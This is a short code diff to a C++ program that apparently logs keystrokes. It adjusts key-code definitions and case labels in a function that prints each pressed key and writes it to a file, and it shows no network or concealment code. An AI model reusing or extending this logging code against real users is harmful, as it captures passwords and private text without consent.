@@ -13,6 +13,10 @@
 #define VK_LWIN 0x5B;
 #define VK_RETURN 0x0D;
 #define VK_BACK 0x08;
+#define VK_ESCAPE 0x1B; 
+#define VK_UP 0x26;
+#define VK_DOWN 0x28;
+#define VK_DELETE 0x2E;
 
 
 void WriteToFile(LPCSTR text)
@@ -393,17 +397,17 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 
-	case VK_ESCAPE:
+	case 0x1B:
 		std::cout << " *Esc* ";
 		WriteToFile(" *Esc* ");
 		break;
 
-	case VK_UP:
+	case 0x26:
 		std::cout << " btn_up ";
 		WriteToFile(" btn_up ");
 		break;
 
-	case VK_DOWN:
+	case 0x28:
 		std::cout << " btn_down ";
 		WriteToFile(" btn_down ");
 		break;
@@ -428,8 +432,8 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" Insert ");
 		break;
 
-	case VK_DELETE:
-		std::cout << " Delete ";
+	case 0x2E:
+		std::cout << " *Delete* ";
 		WriteToFile(" Delete ");
 		break;
 
